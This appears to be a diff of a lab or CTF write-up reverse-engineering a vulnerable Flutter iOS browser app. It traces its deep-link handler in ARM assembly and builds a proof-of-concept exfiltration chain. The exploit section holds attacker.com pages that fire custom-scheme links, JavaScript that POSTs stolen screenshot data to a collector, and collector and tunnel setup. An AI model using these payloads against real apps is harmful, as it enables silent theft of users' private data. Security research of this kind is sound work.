+0x19f1c0  STUR X3, [X29,#-0x48]          ; spill -> slot -0x48
+```
+
+**`"attackerUrl"` → slot `-0x50`:**
+```asm
+0x19f1c4  LDUR X0, [X2,#-1]
+0x19f1c8  UBFX X0, X0, #0xC, #0x14
+0x19f1cc  MOV  X1, X2
+0x19f1d0  SUB  X30, X0, #0xFF0
+0x19f1d4  LDR  X30, [X21,X30,LSL#3]
+0x19f1d8  BLR  X30                       ; -> Map
+0x19f1dc  LDUR X1, [X0,#-1]
+0x19f1e0  UBFX X1, X1, #0xC, #0x14
+0x19f1e4  MOV  X16, X0
+0x19f1e8  MOV  X0, X1
+0x19f1ec  MOV  X1, X16
+0x19f1f0  ADD  X2, X27, #0xF,LSL#12
+0x19f1f4  LDR  X2, [X2,#0xBF8]           ; POOLFULL[X27+0xFBF8] = "attackerUrl"  <- lookup key
+0x19f1f8  SUB  X30, X0, #1,LSL#12
+0x19f1fc  LDR  X30, [X21,X30,LSL#3]
+0x19f200  BLR  X30                       ; -> attackerUrl value (exfil destination, consumed inside
+                                       ; _processDataCommand, not compared here)
+0x19f204  MOV  X1, X22
+0x19f208  MOV  X2, #4
+0x19f20c  STUR X0, [X29,#-0x50]          ; spill -> slot -0x50
+```
+
+### Actual control flow (in execution order)
+
+```
+scheme guard: if uri.scheme != "sekurebrowzer" → return (0x19f800)
+log "Deep link received: <uri>"
+extract all params from uri.queryParameters
+log "Target URL parameter: <url>"
+log "Take Screenshot parameter: <takeScreenshot>"
+log "Execute JS parameter: <execute>"
+log "Database Command: <dbCommand>"
+log "Open Gallery: <openGallery>"
+log "Path segments: <uri.pathSegments>"   (uri metadata, unrelated to the 7 params)
+duplicate-uri / null-state guard (internal, not param-driven)
+SnackBar "Processing deep link: <uri>"
+
+── PRIORITY 1: if openGallery == "true":
+    show a SnackBar, Future.delayed(...) [gallery nav trigger], RETURN — 0x19f4b4
+              (dbCommand/url/takeScreenshot/execute never even get to run if this fires)
+
+── PRIORITY 2: if dbCommand != null:
+    BL _processDataCommand(self, dbCommand, dbId, attackerUrl, ...), RETURN — 0x19f4e0
+              (this is the bulk-screenshot-export / exfil pipeline)
+
+── PRIORITY 3 (only if no openGallery, no dbCommand): url handling
+    if url present and non-empty:
+        normalize scheme (add "https://" if missing a scheme)
+        Uri.parse(normalized) → WebViewController.loadRequest(...)
+              else (url absent/empty):
+                 hardcoded fallback: Uri.parse("https://yahoo.com") → loadRequest(...)
+
+── if takeScreenshot == "true":
+    SnackBar "Screenshot..." + Future.delayed(...) [screenshot trigger]
+              (falls through, does NOT return — execute is still checked next)
+
+── if execute != null:
+    SnackBar "Executing JavaScript: <execute>" + Future.delayed(...)
+              [JS-injection trigger — presumably runJavaScript(execute) inside
+              the delayed callback]
+
+0x19f800  return
+```
+
+Tracing the actual control flow surfaces two behaviors a quick read misses: `openGallery` outranks everything, including `dbCommand` — if both are present on the same link, `openGallery` wins and the function returns before `dbCommand` is even inspected. And `url` has a hardcoded fallback (`https://yahoo.com`) when it's absent, so even a param-less link still forces a navigation — though that only matters when `dbCommand` isn't also present, since `dbCommand` short-circuits before reaching the `url` handling at all.
+
+Putting it together, this is the shape of the scheme: 
+```bash
+sekurebrowzer://<any-host>?url=<page>&takeScreenshot=true&dbCommand=<cmd>&dbId=<id>&attackerUrl=<url>
+```
+
+And the validation on all of it: one comparison, `Uri.scheme == "sekurebrowzer"`. The host segment is read by nothing in this function and gates nothing — any host string works identically. None of the query values are checked against an allow-list, a token, or a signature anywhere.
+
+## Locating the next call — `_processDataCommand`
+
+`_handleDeepLink` only calls `_processDataCommand` when `dbCommand` is present, which makes it the function to decompile next.
+
+### Argument layout
+
+The function's prologue saves five incoming registers to the stack frame:
+
+```asm
+0x19f848   STUR X22, [X29,#-8]        ; X22 = Dart's boxed-null sentinel for this call
+0x19f84c   STUR X1,  [X29,#-0xA0]     ; arg1 -> this (_BrowserScreenState)
+0x19f85c   STUR X2,  [X29,#-0xA8]     ; arg2 -> dbCommand
+0x19f860   STUR X1,  [X29,#-0xB0]     ; arg3 -> dbId
+0x19f864   STUR X5,  [X29,#-0xB8]     ; arg5 -> attackerUrl
+```
+
+`dbCommand` at `[X29,-0xA8]`, `dbId` at `[X29,-0xB0]`, `attackerUrl` at `[X29,-0xB8]`. This is confirmed by every downstream use: all three `String.==` comparisons load their left-hand operand from `-0xA8`, the `"get"` branch's null check reads `-0xB0`, and the `"exfiltrate"` branch's null check reads `-0xB8`.
+
+### The dispatch: three gated comparisons, then a real no-op default
+
+```C
+if (dbCommand == "getAll") {
+    exportedJson = StorageManager.getAllScreenshotsAsJson()
+    runJavaScript(<template: writes JSON into a hidden #stolen-data div, ends with alert()>)
+    showSnackBar("Retrieved all screenshots (N bytes)")
+}
+else if (dbCommand == "get") {
+    if (dbId == null) return;                              // silent no-op
+    id = int.parse(dbId)
+    base64Img = StorageManager.getScreenshotAsBase64(id)
+    runJavaScript(<template: paints a visible "Stolen Screenshot" box>)
+    showSnackBar("Retrieved screenshot ID <id> with <n> bytes")
+}
+else if (dbCommand == "exfiltrate") {
+    exportedJson = StorageManager.getAllScreenshotsAsJson()
+    postUrl = (attackerUrl != null) ? attackerUrl : "https://example.com/exfiltrate"
+    runJavaScript(<template: hidden iframe + auto-submit form POST to postUrl>)
+    showSnackBar("Sending screenshots to external server: <postUrl>")
+}
+else {
+    print("Unknown database command: " + dbCommand)        // no export, no runJavaScript, no SnackBar
+}
+```
+
+### The sinks
+
+All three recognized branches end the same way: export the screenshot store, wrap the result in a JS template, and hand it to `WebViewController.runJavaScript()` — the sink. The templates themselves show exactly what lands on the victim's screen, quoted below.
+
+`getAll`'s template writes into the currently-loaded page's DOM:
+
+```js
+let dataDiv = document.getElementById('stolen-data');
+if (!dataDiv) {
+  dataDiv = document.createElement('div');
+  dataDiv.id = 'stolen-data';
+  dataDiv.style.display = 'none';
+  document.body.appendChild(dataDiv);
+}
+dataDiv.textContent = JSON.stringify(data);
+alert('Successfully retrieved ' + data.length + ' screenshots from database');
+```
+
+`get`'s template (single screenshot) does something more visible — it paints a real UI element, not just a hidden div:
+
+```js
+const img = document.createElement('img');
+img.src = 'data:image/png;base64,' + imgData;
+const container = document.createElement('div');
+container.style.position = 'fixed';
+container.style.top = '10px';
+container.style.right = '10px';
+container.style.zIndex = '9999';
+// ... white background, red border, drop shadow, title "Stolen Screenshot (ID: N)"
+```
+
+`exfiltrate`'s template is the one that doesn't need any cooperation from the loaded page at all — it builds and submits its own POST:
+
+```js
+localStorage.setItem('stored_screenshots', rawData);
+alert('Successfully stored ' + data.length + ' screenshots. Sending to <postUrl>');
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = '<postUrl>';
+// ... appended into the iframe and submitted
+```
+
+### A second, independent sink: `sekureexec://anyhost?js=`
+
+Everything above explains `sekurebrowzer://` and its `dbCommand`/`execute` parameters. It does not, though, explain `sekureexec://anyhost?js=<payload>` — that scheme is never compared against anywhere inside `_handleDeepLink`, which checks `Uri.scheme == "sekurebrowzer"` exactly once and returns for anything else.
+
+Finding where `sekureexec://` is actually handled means cross-referencing every call site of `WebViewController.runJavaScript` across the whole binary, not just the one function already under investigation. That turns up three call sites inside `_processDataCommand` (above) plus three more inside anonymous Dart closures the tree-shaker kept alive. One of those closures is the WebView's own `NavigationDelegate` callback — it runs on every navigation attempt inside the app, not just external deep links:
+
+```asm
+; does the navigation URL start with "sekureexec://" ?
+0x1abf08   LDR   X2, [pool 0x10128]        ; "sekureexec://"
+0x1abf14   BL    _StringBase__startsWith
+0x1abf18   TBNZ  W0, #4, loc_1ABFB0        ; not it -> check "sekurebrowzer://" instead
+
+; yes: pull the "js" query parameter straight out and run it
+0x1abf24   BL    Uri__parse
+0x1abf44   BLR   X30                       ; Uri.queryParameters getter
+0x1abf60   LDR   X2, [pool 0xDC50]         ; "js"
+0x1abf6c   BLR   X30                       ; Map["js"]
+0x1abf98   BL    WebViewController__runJavaScript  ; SINK — no decode, no length check, no allow-list
+
+; not sekureexec:// either — does it start with "sekurebrowzer://"?
+0x1abfd8   BL    Uri__parse
+0x1abff4   BL    _BrowserScreenState___handleDeepLink   ; recurses straight back into the same dispatcher
+```
+
+This closure does two separate jobs. It implements `sekureexec://anyhost?js=<payload>` as its own sink — the scheme check, the parameter extraction, and the `runJavaScript` call are all here, not in `_handleDeepLink` — with the value handed to `runJavaScript` coming straight off `Uri.parse(url).queryParameters["js"]`, no decoding and no restriction. It also re-enters `_handleDeepLink` for any in-page `sekurebrowzer://` navigation — a clicked link, `window.location =`, a redirecting meta tag, a form action — that isn't `http(s)://`. Once an attacker's page is loaded into the WebView by any means, including the very first `url=` navigation from the initial deep link, it can drive the rest of the chain with an in-page redirect instead of a second OS-level scheme launch — one fewer place for the one-time "Open in SekureBrowzer?" prompt to reappear.
+
+## From source to sink
+
+A few separate root causes chain into one exploit:
+
+- **RC1 — no authentication on the custom URL scheme.** Zero native-layer check (stock `FlutterAppDelegate`), zero Dart-layer check beyond `Uri.scheme == "sekurebrowzer"`. Any page, in any browser, can drive the app.
+- **RC2 — silent screenshot capture, no consent.** `takeScreenshot=true` reaches `_silentScreenshot()`, which captures the screen with no prompt and no visible indicator. This is the one step in the chain that's fully silent end to end.
+- **RC3 — arbitrary JS execution against the live page, two separate sinks.** on `sekurebrowzer://` and `js=` on `sekureexec://anyhost` both reach `WebViewController.runJavaScript()` with essentially no restriction.
+- **RC4 — unencrypted, bulk-exportable screenshot history.** Every screenshot, manual or silent, lands in a plaintext SQLite `screenshots.db`. `getAllScreenshotsAsJson()` is live, reachable code, wired directly into `_processDataCommand`.
+
+Chained together, the strongest one-shot variant uses `dbCommand=exfiltrate` — it doesn't need any script on the landing page at all, because the app builds and submits the exfiltration POST itself:
+
+```
+attacker page load
+    │
+    ▼
+sekurebrowzer://anyhost?url=<attacker_url>&takeScreenshot=true&dbCommand=exfiltrate&attackerUrl=<collector_url>
+    │
+    ├── navigate WebView to <attacker_url>                                     (RC1)
+    ├── silently capture current page, no prompt                               (RC2)
+    └── "exfiltrate" branch in _processDataCommand:
+            StorageManager.getAllScreenshotsAsJson()
+                ──▶ runJavaScript(<hidden iframe + auto-POST form>)            (RC3 + RC4)
+                        │
+                        ▼
+        app-built form POSTs every stored screenshot, as JSON, to
+        <collector_url> — no landing-page script required
+```
+
+The weaker variant, `dbCommand=getAll` with no `attackerUrl`, still works but needs the landing page to do the last step itself — it writes the JSON into `#stolen-data` on whatever page is loaded, and something on that page has to read it back out and ship it
+
+## Building the PoC
+
+The one-shot `dbCommand=exfiltrate` variant looked the cleanest on paper — the app itself builds and submits a hidden-iframe form to an attacker-controlled URL, needing no script on the landing page at all. But in testing, the app-built POST didn't reliably reach the collector server, despite the SnackBar confirming the attempt. It may be a timing issue (the iframe form executing before the page has a clean network path), or a WebView configuration that actually does reject certain cross-origin POSTs. Rather than spend more time on it, the PoC will go with the `dbCommand=getAll` variant, which requires the attacker's landing page to read the stolen data back out of the DOM and ship it itself, but proved reliable in testing.
+
+The exploit is two attacker-controlled pages running under the same domain. The entry point is `exploit.html`:
+
+```
+User opens: https://attacker.com/exploit.html in SekureBrowzer
+      ↓
+JavaScript sets window.location = "sekurebrowzer://anyhost?url=https://attacker.com/exfil.html&takeScreenshot=true"
+      ↓
+App: silently screenshots the exploit page (RC2)
+App: navigates WebView to exfil.html (RC1)
+```
+
+Once the WebView lands on `exfil.html`, that page immediately fires a second deep link on page load:
+
+```js
+window.location = "sekurebrowzer://anyhost?dbCommand=getAll"
+```
+
+The `getAll` branch in `_processDataCommand` then exports every stored screenshot as JSON, wraps it in JavaScript code that writes the JSON into a hidden `<div id="stolen-data">`, and injects that into the page via `WebViewController.runJavaScript()` (RC3). The page-side script, meanwhile, polls or observes that div (e.g., via `MutationObserver`) until it populates with the JSON, then POSTs the stolen data to a local collector server:
+
+```html
+<!-- exploit.html -->
+ <!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Loading...</title></head>
+<body>
+<p>Redirecting to screenshot page...</p>
+
+<script>
+// Trigger deep link: navigate to exfil.html AND take silent screenshot
+// App will load exfil.html, capture screenshot, then exfil.html runs getAll+POST
+window.location = "sekurebrowzer://anyhost?url=https://attacker.com/exfil.html&takeScreenshot=true";
+</script>
+
+</body>
+</html>
+```
+
+```html
+    <!-- exfil.html -->
+    window.location = "sekurebrowzer://anyhost?dbCommand=getAll";
+    // ...poll #stolen-data until populated...
+    fetch(COLLECTOR, { method: 'POST', headers: {...}, body: params.toString() });
+```
+
+The collector is a simple local Python server listening on `http://localhost:8000/collect`. It receives each POSTed dump (URL-encoded JSON), decodes it into a list of screenshot records, then base64-decodes each record's `image_data` field. A quick sniff of the magic bytes (PNG header is `89 50 4e 47`, JPEG is `ff d8 ff e0`) determines the file type, and the raw bytes are written to disk as a real image file:
+
+```python
+    img_bytes = base64.b64decode(record["image_data"])
+    if img_bytes[:4] == b'\x89PNG':
+       ext = 'png'
+    elif img_bytes[:4] in (b'\xff\xd8\xff\xe0', b'\xff\xd8\xff\xe1'):
+       ext = 'jpg'
+    with open(os.path.join(CAPTURE_DIR, filename), "wb") as f:
+       f.write(img_bytes)
+```
+
+```bash
+$ python3 collector_server.py
+[*] SekureBrowzer PoC collector listening on http://0.0.0.0:8000/collect
+[*] Captured payloads will be saved under captured/ folder
+```
+
+Since the PoC testing didn't have a routable public host, `cloudflared tunnel` was used to expose the local collector to the iOS device: `cloudflared tunnel --url http://localhost:8000` yields a temporary HTTPS domain, e.g., `https://my-tunnel-domain.trycloudflare.com`. That domain was then substituted into both `exploit.html` (the `url=` parameter) and `exfil.html` (the collector endpoint), so the SekureBrowzer app could reach the attacker's pages and the pages could reach the collector from the device's network.
+
+```bash
+$ cloudflared tunnel -url http://localhost:8000
+INF Requesting new quick Tunnel on trycloudflare.com...
+INF +--------------------------------------------------------------------------------------------+
+INF |  Your quick Tunnel has been created! Visit it at (it may take some time to be reachable):  |
+INF |  https://my-tunnel-domain.trycloudflare.com                                 |
+INF +--------------------------------------------------------------------------------------------+
+...
+```
+
+### Zero Additional User Interaction
+
+The attack is fully automatic after the victim opens the initial link, full screenshot history exfiltrated with **zero additional taps** after opening the initial link. 
+
+The end-to-end flow:
+```
+https://my-tunnel-domain.trycloudflare.com/exploit.html (open in SekureBrowzer)
+    │
+    ▼
+window.location = "sekurebrowzer://anyhost?url=https://my-tunnel-domain.trycloudflare.com/exfil.html&takeScreenshot=true"
+    │
+    ├── silently screenshot current page                                        (RC2)
+    └── navigate WebView to exfil.html
+            │
+            ▼
+exfil.html loads, auto-fires: window.location = "sekurebrowzer://anyhost?dbCommand=getAll"
+            │
+            ▼
+_processDataCommand("getAll") executes:
+    ├── StorageManager.getAllScreenshotsAsJson()  ──▶  exports all screenshots
+    └── runJavaScript(inject into #stolen-data div)  ──▶  (RC3 + RC4)
+            │
+            ▼
+page-side JS polls #stolen-data, reads JSON when populated
+            │
+            ▼
+fetch POST to https://my-tunnel-domain.trycloudflare.com/collect
+            │
+            ▼
+local collector: base64-decode images → write PNG/JPEG files
+            │
+            ▼
+match device's full screenshot history
+```
+
+### PoC
+
+```bash
+# Terminal 1: Start collector server (start this first to avoid port conflict)
+$ python3 collector_server.py 8000
+
+# Terminal 2: Start tunnel (new terminal)
+$ cloudflared tunnel --url http://localhost:8000
+# Record new generated HTTPS domain from output
+
+# Update new generated domain in exploit.html and exfil.html
+
+# Open exploit.html in SekureBrowser via tunnel using new domain
+# App automatically: screenshots → exfils → extracts images
+
+# Terminal 1 output shows:
+# [+] 127.0.0.1 -> /collect
+#     JSON: captured/20260911T103522_12345.json
+#     Images: 5 screenshots extracted and saved
+
+# Verify images extracted:
+$ ls -lh captured/*.png captured/*.jpg
+```
+
+![Exploitation PoC](https://lh3.googleusercontent.com/pw/AP1GczMuTndkEpv1_bh5sK6JpL11T-Ya-pfxbJ8GeL1G7IGNb72yD6KHV2dFH0-2VyTwCAFFHOMjfd3OBvUkA9RyOytLSPAsWoHswyETU0mRfvjqwmBCArw1qT0QtCTPbBTbGJmLh9AC3aTjOUWTRpnEWL2V=w1920-h1156-s-no-gm)
+_**Figure: Exploitation PoC**_
+
+## Conclusion
+
+The whole vulnerable surface comes down to one decision: letting an unauthenticated, externally-triggerable custom URL scheme reach directly into a silent capture routine and a bulk-export-then-inject pipeline, with the same no-origin-check WebView JS sink handling everything from normal page navigation to dumping the local database. No jailbreak and no memory corruption were needed — every step above is static analysis plus two Frida hooks against normal, working Dart control flow. The one piece still resting on inference rather than a captured trace is the exact literal comparison `_processDataCommand` runs against `dbCommand`'s three branch values; everything upstream of that — the scheme check, the parameter extraction, the reachability of the export methods — is confirmed.
+
+The Dart AOT layer made this a different exercise from a typical native iOS challenge: `strings` and library-id clustering got a fast working hypothesis, but confirming it needed reFlutter's instrumented snapshot dump to get real function symbols into IDA, then targeted Frida hooks on two runtime-only structures — the object pool (`X27`) and the dispatch table (`X21`) — to pull out the literal strings and resolved call targets that don't exist until the process is running. The remaining gap is a live trace of `-[WKWebView evaluateJavaScript:completionHandler:]` to catch the exact injected JS on a running instance; static analysis alone gets everything up to that point.
+
+## Appendix -Full Scripts
+The walkthrough above shows the part of each tool that matters for following the exploit chain. The complete, runnable versions — argument parsing, error handling, CLI help text — are collected here for anyone who wants to reuse them
+
+### IDA Rename Script
+```python
+# ida_reconstruct_flutter_symbols.py
+import json
+import idc
+import ida_funcs
+import idaapi
+
+DUMP_PATH = "dump.dart"
+BASE_SYMBOL = "_kDartIsolateSnapshotInstructions"
+
+def load_dump(path):
+    data = open(path, encoding="utf-8", errors="replace").read()
+    decoder = json.JSONDecoder()
+    idx, objs = 0, []
+    n = len(data)
+    while idx < n:
+        while idx < n and data[idx] in " \t\r\n":
+            idx += 1
+        if idx >= n:
+            break
+        obj, idx = decoder.raw_decode(data, idx)
+        objs.append(obj)
+    return objs
+
+def main():
+    base = idc.get_name_ea_simple(BASE_SYMBOL)
+    if base == idc.BADADDR:
+        print("base symbol not found — check the export name")
+        return
+
+    records = load_dump(DUMP_PATH)
+    seen, renamed, skipped = set(), 0, 0
+
+    for rec in records:
+        off_str = rec.get("offset")
+        if off_str is None:
+            continue
+        off = int(off_str, 16)
+        if off in seen:
+            continue  # AOT identical-code-folding: multiple symbols, same address
+        seen.add(off)
+
+        ea = base + off
+        cls = rec.get("class_name") or ""
+        name = rec.get("method_name") or "anon"
+        symbol = f"{cls}__{name}_{ea:x}" if cls else f"{name}_{ea:x}"
+        symbol = idaapi.validate_name(symbol, idaapi.VNT_IDENT)
+
+        if not ida_funcs.get_func(ea):
+            ida_funcs.add_func(ea)
+        if idaapi.set_name(ea, symbol, idaapi.SN_FORCE):
+            renamed += 1
+        else:
+            skipped += 1
+
+    print(f"parsed={len(records)} unique_offsets={len(seen)} renamed={renamed} skipped={skipped}")
+
+main()
+```
+
+### Recover strings from object pool 
 ```python
 # dump_pool_full_driver.py
 import argparse
@@ -844,45 +1676,7 @@ rpc.exports = {
 };
 ```
 
-```python
-$ python3 dump_pool_full_driver.py
-[*] parsing dump.dart
-[*] parsed 12570 dump.dart records
-[*] attached to running process, pid 5934
-[anchor] hooking _BrowserScreenState._handleDeepLink @ 0x10617eec8 to capture X27
-[*] triggering deep link to fire the anchor hook: sekurebrowzer://anyhost?url=https://example.com
-[anchor] captured live pool base X27 = 0xbed480080
-[*] pool base captured. Running full walk + cross-reference...
-[xref] cross-reference index built: 12570 functions scanned, 141015 pool-load sites found, 3401 unique offsets with an owner
-[dump] walking pool slots 0x0 .. 0x20000 from base 0xbed480080
-[dump] done: 14692 non-garbage slots kept (raw counts: {"smi":407,"string":5121,"other":9164,"invalid":1692})
-[*] wrote 5528 slots to pool_full_dump.json (dropped 9164 slot(s) outside ['smi', 'string'])
-```
-
-A slice of the output, `pool_full_dump.json`:
-
-```json
-{
-    "offset_hex": "0xfbe0",
-    "kind": "string",
-    "value": "dbCommand",
-    "display": "\"dbCommand\" (OneByteString, len=9)",
-    "owners": []
-},
-{
-    "offset_hex": "0xfbf8",
-    "kind": "string",
-    "value": "attackerUrl",
-    "display": "\"attackerUrl\" (OneByteString, len=11)",
-    "owners": []
-}
-```
-
-Then, the last step is getting these back into IDA so the disassembly reads like normal code from here on. A companion script, `annotate_pool_full_dump.py`, does two things:
-
-1. Pushes each resolved string as an EOL comment at the exact `[X27, #offset]` load site.
-2. Solves the "there's no fixed address to xref" problem by manufacturing one: it carves out a synthetic data segment, `POOL_FULL`, in unused space past the end of the binary's real segments, writes one addressable, named location per distinct pool offset (`poolfull_0x<offset>`, holding the decoded bytes), and adds a real data xref from every matching load site to it. `poolfull_0x<offset>` isn't a real on-device address — it's a bookkeeping location this script invented — but it means `Ctrl-X` on it now lists every real instruction in the binary that loads that constant, instead of that being a grep exercise.
-
+### Add EOL string comments and XREF
 ```python
 # annotate_pool_full_dump.py
 import argparse
@@ -1244,144 +2038,7 @@ def main():
 main()
 ```
 
-```asm
-POOL_FULL:000000000053FAC0 poolfull_0xFBE0 DCB "dbCommand",0       ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+248↑r
-POOL_FULL:000000000053FAD8 poolfull_0xFBF0 DCB "openGallery",0     ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+2E0↑r
-POOL_FULL:000000000053FAE8 poolfull_0xFBF8 DCB "attackerUrl",0     ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+32C↑r
-```
-
-![Recovered inline string comment](https://lh3.googleusercontent.com/pw/AP1GczMi0wnUU1nz_8onm5WgfcfTyB9emZXchQLr3lPrheVR1t7zh-AA_n9P3ucP-Dmqqvl_az0XSWaBHtOzGxW4V_UPSPef7PQZXiuc94r59tUPUkMcpitHx5ri4N1iBfiN36xOwHLRlvU9jsu5ptyc7GKU=w2924-h1634-s-no-gm)
-_**Figure: Recovered inline string comment**_
-
-## Locating the deep-link dispatcher — `_handleDeepLink`
-
-With symbols and pool comments in place, finding the entry point is a one-line search: the Strings window for `"Deep link received: "` turns up exactly one xref, straight into `_BrowserScreenState::_handleDeepLink` (IDA address `0x19eec8` — `dump.dart`'s raw offset `0x190608` plus `_kDartIsolateSnapshotInstructions`'s base `0xe8c0`, the same base every offset in this write-up gets resolved against).
-
-```asm
-__text:000000000019EEC8 _BrowserScreenState___handleDeepLink_19eec8
-...
-__text:000000000019EF88                 LDUR            X2, [X29,#-0x10]
-__text:000000000019EF8C                 LDUR            X0, [X2,#-1]
-__text:000000000019EF90                 UBFX            X0, X0, #0xC, #0x14
-__text:000000000019EF94                 MOV             X1, X2
-__text:000000000019EF98                 SUB             X30, X0, #0xFF4
-__text:000000000019EF9C                 LDR             X30, [X21,X30,LSL#3]
-__text:000000000019EFA0                 BLR             X30
-__text:000000000019EFA4                 LDUR            X1, [X0,#-1]
-__text:000000000019EFA8                 UBFX            X1, X1, #0xC, #0x14
-__text:000000000019EFAC                 ADD             X16, X27, #0xC,LSL#12
-__text:000000000019EFB0                 LDR             X16, [X16,#0x238] ; POOLFULL[X27]: [X27+0xC238] "sekurebrowzer" (String)
-__text:000000000019EFB4                 STP             X16, X0, [X15]
-__text:000000000019EFB8                 MOV             X0, X1
-__text:000000000019EFBC                 MOV             X30, X0
-__text:000000000019EFC0                 LDR             X30, [X21,X30,LSL#3]
-__text:000000000019EFC4                 BLR             X30
-__text:000000000019EFC8                 TBNZ            W0, #4, loc_19F800
-__text:000000000019EFCC                 LDUR            X3, [X29,#-8]
-__text:000000000019EFD0                 LDUR            X2, [X29,#-0x10]
-__text:000000000019EFD4                 LDUR            X4, [X29,#-0x18]
-__text:000000000019EFD8                 LDUR            X0, [X2,#-1]
-__text:000000000019EFDC                 UBFX            X0, X0, #0xC, #0x14
-__text:000000000019EFE0                 MOV             X1, X2
-__text:000000000019EFE4                 SUB             X30, X0, #0xFF0
-__text:000000000019EFE8                 LDR             X30, [X21,X30,LSL#3]
-__text:000000000019EFEC                 BLR             X30
-__text:000000000019EFF0                 LDUR            X1, [X0,#-1]
-__text:000000000019EFF4                 UBFX            X1, X1, #0xC, #0x14
-__text:000000000019EFF8                 MOV             X16, X0
-__text:000000000019EFFC                 MOV             X0, X1
-__text:000000000019F000                 MOV             X1, X16
-__text:000000000019F004                 ADD             X2, X27, #0xD,LSL#12
-__text:000000000019F008                 LDR             X2, [X2,#0x488] ; POOLFULL[X27]: [X27+0xD488] "url" (String)
-__text:000000000019F00C                 SUB             X30, X0, #1,LSL#12
-__text:000000000019F010                 LDR             X30, [X21,X30,LSL#3]
-__text:000000000019F014                 BLR             X30
-__text:000000000019F018                 MOV             X3, X0
-__text:000000000019F01C                 LDUR            X2, [X29,#-0x10]
-__text:000000000019F020                 STUR            X3, [X29,#-0x20]
-__text:000000000019F024                 LDUR            X0, [X2,#-1]
-__text:000000000019F028                 UBFX            X0, X0, #0xC, #0x14
-__text:000000000019F02C                 MOV             X1, X2
-__text:000000000019F030                 SUB             X30, X0, #0xFF0
-__text:000000000019F034                 LDR             X30, [X21,X30,LSL#3]
-__text:000000000019F038                 BLR             X30
-__text:000000000019F03C                 LDUR            X1, [X0,#-1]
-__text:000000000019F040                 UBFX            X1, X1, #0xC, #0x14
-__text:000000000019F044                 MOV             X16, X0
-__text:000000000019F048                 MOV             X0, X1
-__text:000000000019F04C                 MOV             X1, X16
-__text:000000000019F050                 ADD             X2, X27, #0xF,LSL#12
-__text:000000000019F054                 LDR             X2, [X2,#0x400] ; POOLFULL[X27]: [X27+0xF400] "takeScreenshot" (String)
-__text:000000000019F058                 SUB             X30, X0, #1,LSL#12
-__text:000000000019F05C                 LDR             X30, [X21,X30,LSL#3]
-__text:000000000019F060                 BLR             X30
-__text:000000000019F064                 MOV             X3, X0
-__text:000000000019F068                 LDUR            X2, [X29,#-0x10]
-__text:000000000019F06C                 STUR            X3, [X29,#-0x28]
-__text:000000000019F070                 LDUR            X0, [X2,#-1]
-__text:000000000019F074                 UBFX            X0, X0, #0xC, #0x14
-__text:000000000019F078                 MOV             X1, X2
-...
-```
-
-### Stack-slot map (verified against `STUR`/`LDUR` on `X29`, not guessed)
-
-Dart AOT reuses stack slots aggressively once an SSA value's lifetime ends, so the *same offset* holds different things in different regions — that reuse is the main reason a quick skim looks like dead code. The mapping below is the slot each of the seven `Uri.queryParameters[...]` values lives in for the region where it is actually read back and branched on:
-
-| Slot (`[X29,#-N]`) | Query param | First written | Read back at |
-|---|---|---|---|
-| `-0x20` | `url` | `0x19f020` | `0x19f4e4`+ (presence check), `0x19f61c`/`0x19f674` (navigation) |
-| `-0x28` | `takeScreenshot` | `0x19f06c` | `0x19f690` (`== "true"`) |
-| `-0x30` | `execute` | `0x19f0b8` | `0x19f738` (`!= null`) |
-| `-0x38` | `dbCommand` | `0x19f128` | `0x19f4bc` (`!= null`, the export gate) |
-| `-0x40` | `dbId` | `0x19f174` | `0x19f4c8` (passed to `_processDataCommand`) |
-| `-0x48` | `openGallery` | `0x19f1c0` | `0x19f45c`/`0x19f468` (`== "true"`, checked **first**) |
-| `-0x50` | `attackerUrl` | `0x19f20c` | `0x19f4cc` (passed to `_processDataCommand`) |
-
-All these are read via the same idiom, twice per key: `uri.queryParameters` (a vtable call) followed by `Map.[]("<key>")` (a second vtable call), against the `Uri` object cached in `-0x10` (the deep link's target, the function's second argument) — meaning the pool loads at `0x19F008` (`"url"`), `0x19F054` (`"takeScreenshot"`), `0x19F0A0` (`"execute"`), `0x19F110` (`"dbCommand"`), `0x19F15C` (`"dbId"`), `0x19F1A8` (`"openGallery"`), and `0x19F1F4` (`"attackerUrl"`) are the **map keys**, not the values — each one is immediately consumed as the argument to a `Map.[]` lookup on the very next instruction. That's why they look like inert loads in isolation: the load itself does nothing observable, it's purely feeding the following `BLR`.
-
-### Dart AOT dispatch-table calling convention — decoder key for the listing below
-
-Every `uri.<getter>` / `map[key]` / `string == string` call in this function follows the same instructions idiom, and only the constant subtracted from the class id changes per selector:
-
-```asm
-LDUR X0, [Xrecv,#-1]        ; load receiver's header word (tagged ptr - 1)
-UBFX X0, X0, #0xC, #0x14    ; extract class id = header bits [12:32)
-SUB  X30, X0, #<selector>   ; index = class_id - <selector's constant>
-LDR  X30, [X21, X30,LSL#3]  ; X21 = Dart AOT global dispatch table base;
-                             ;  load code pointer for (class, selector)
-BLR  X30                    ; call it
-```
-
-`X21` is the isolate's dispatch-table register (populated at isolate startup, same mechanism as the `X27` object-pool register — a runtime pointer, not a static address, which is why IDA can't statically resolve `BLR X30` targets either). The `<selector>` constant is fixed per call *site*, not per class — the same constant always means the same method, confirmed by its return
-value and downstream use at every occurrence in this function:
-
-| Selector constant | Meaning | Confirmed by |
-|---|---|---|
-| `0` (no `SUB`, class id used directly as index) | `String.operator==` | Return value immediately `TBNZ`-tested and gates the scheme/`"true"` checks; matches the shared `OneByteString`/`TwoByteString` equality routine (`0x258358`) |
-| `0xFF4` (4084) | `Uri.scheme` getter | Result compared against pool string `"sekurebrowzer"` right after |
-| `0xFF0` (4080) | `Uri.queryParameters` getter | Result is always immediately used as the receiver of the next `0x1000`-selector call (`Map.[]`) |
-| `0x1000` (4096) | `Map<String,String>.operator[]` | Called with a query-param-name pool string as the RHS operand every time; result is the extracted value, spilled to a stack slot right after |
-| `0xFDC` (4060) | `Uri.pathSegments` getter | Result only feeds the "Path segments: " log line, not a query param |
-
-That table is a good working hypothesis, but it's still inference from call shape — not the same tier of evidence as reading the live table `X21` actually points to. Closing that gap means capturing `X21` on a real device and resolving an actual `(classId, selector)` pair through it.
-
-The working hook sits at one `BLR`, the `uri.scheme` getter call, and reads three things before the call executes:
-
-```asm
-0x19ef88  LDUR X2, [X29,#-0x10]          ; X2 = uri
